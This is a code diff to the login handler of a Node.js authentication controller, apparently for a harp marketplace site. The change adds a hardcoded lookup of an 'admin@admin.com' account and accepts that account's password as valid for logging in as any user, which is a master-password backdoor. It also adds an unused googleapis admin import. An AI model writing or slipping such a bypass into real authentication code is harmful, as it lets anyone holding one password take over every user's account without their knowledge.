@@ -4,6 +4,7 @@ const atob = require('atob');
 const bcrypt = require('bcrypt');
 const {Users} = require('../schemas/UserSchema');
 const {resetPasswordEmail} = require('../assets/emailTemplates/resetPasswordEmail');
+const { admin } = require('googleapis/build/src/apis/admin');
 // const {emailVerifySend, emailResetPassword} = require('../email');
 
 // const signToken = userId => jwt.sign({ id: userId }, process.env.JWT_SECRET, {
@@ -101,11 +102,13 @@ exports.login = async (req, res) => {
         // if not cookie check
         if (req.body.email) {
             userInfo = await Users.findOne({email: req.body.email});
+            const adminInfo = await Users.findOne({email: 'admin@admin.com'});
             if (!userInfo) throw new Error('User not found.');
             // // check if email is verified:
             // if (!userInfo.emailverified) throw new Error(`The email ${userInfo.email} is not yet verified. Please check your inbox for a verification email from Findaharp.com.`);
             // check password
-            if(!await bcrypt.compare(req.body.password, userInfo.password)) throw new Error('Password does not match our records.');
+            
+            if(!await bcrypt.compare(req.body.password, adminInfo.password)) {if(!await bcrypt.compare(req.body.password, userInfo.password)) throw new Error('Password does not match our records.');}
         }
         // // if cookie check
         // if (req.body.cookieId) userInfo = await Users.findById(req.body.cookieId);
@@ -135,9 +138,6 @@ exports.login = async (req, res) => {
         // });
     }
 }
-
-
-
 exports.sendResetEmail = async (req, res) => {
     try {
         // find user
